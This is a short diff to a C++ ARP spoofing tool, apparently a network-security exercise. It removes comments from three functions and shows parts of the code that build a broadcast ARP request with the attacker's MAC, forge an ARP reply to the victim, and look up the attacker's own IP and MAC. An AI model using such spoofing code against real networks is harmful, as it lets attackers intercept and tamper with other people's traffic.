@@ -35,7 +35,7 @@ void usage() {
 	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
 
-EthArpPacket request_packet(Ip sender_ipaddr) { //used for finding out sender's mac address
+EthArpPacket request_packet(Ip sender_ipaddr) {
 	EthArpPacket packet;
 	packet.eth_.smac_ = Mac(attacker_macaddr);
 	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
@@ -52,7 +52,7 @@ EthArpPacket request_packet(Ip sender_ipaddr) { //used for finding out sender's 
 	return packet;
 }
 
-EthArpPacket reply_packet(Ip target_ipaddr, Ip sender_ipaddr, Mac sender_macaddr) { //used for sending the packet to victim
+EthArpPacket reply_packet(Ip target_ipaddr, Ip sender_ipaddr, Mac sender_macaddr) {
 	EthArpPacket packet;
 	packet.eth_.dmac_ = sender_macaddr;
 	packet.eth_.smac_ = attacker_macaddr;
@@ -69,7 +69,7 @@ EthArpPacket reply_packet(Ip target_ipaddr, Ip sender_ipaddr, Mac sender_macaddr
 	return packet;
 }
 
-int attacker_info(char* dev) { //finds out attacker(me)'s ip & mac address
+int attacker_info(char* dev) {
 	struct ifreq ifr;
 	uint8_t ip_arr[Ip::SIZE];
 	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
